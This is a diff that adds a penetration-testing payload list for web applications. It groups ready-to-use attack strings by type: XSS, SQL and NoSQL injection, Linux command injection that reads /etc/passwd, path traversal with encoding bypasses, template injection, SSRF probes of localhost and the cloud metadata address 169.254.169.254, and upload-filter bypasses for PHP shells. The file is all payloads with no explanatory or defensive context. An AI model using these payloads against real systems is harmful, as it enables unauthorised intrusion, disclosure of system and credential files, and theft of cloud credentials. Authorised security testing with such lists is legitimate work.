@@ -1,0 +1,89 @@
+
+=> Payloads
+
+---> XSS Basic <---
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+
+---> XSS Attribute Breaking <---
+" onmouseover=alert(1) x="
+' onfocus=alert(1) x='
+
+---> XSS Bypass Filters <---
+<ScRiPt>alert(1)</ScRiPt>
+<svg><script>alert(1)</script>
+
+---> XSS DOM <---
+#<img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+javascript:alert(1)
+
+---> XSS Encoded <---
+%3Cscript%3Ealert(1)%3C/script%3E
+&lt;svg onload=alert(1)&gt;
+
+---> SQLi Auth Bypass <---
+' OR '1'='1
+" OR 1=1--
+'--
+
+---> SQLi Union/Error <---
+' UNION SELECT null,null--
+
+---> SQLi Time Based <---
+' AND sleep(5)--
+
+---> SQLi Boolean Blind <---
+' AND 1=1--
+' AND 1=2--
+
+---> No SQLi <---
+{"$ne":null}
+{"$gt":""}
+
+---> Command Injection Linux <---
+;id
+| whoami
+&& whoami
+| cat /etc/passwd
+$(id)
+id
+
+---> Command Injection Linux Blind <---
+| sleep 5
+&& ping -c 2 127.0.0.1
+
+---> Path Traversal Linux <---
+../
+../../etc/passwd
+....//....//etc/passwd
+
+---> Path Traversal Filter Bypass <---
+..%2f..%2fetc%2fpasswd
+..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%afetc%c0%afpasswd
+
+---> Path Traversal Windows <---
+..\..\windows\win.ini
+..%5c..%5cwindows%5cwin.ini
+
+---> SSTi <---
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+<#assign x=7*7>
+
+---> SSRF <---
+http://127.0.0.1/admin
+http://127.0.0.1
+http://localhost
+http://169.254.169.254/
+http://169.254.169.254/latest/meta-data/
+http://internal-service/admin
+
+---> File Upload Bypass <---
+shell.php.jpg
+shell.phtml
+shell.php%00.jpg
+Content-Type: image/png
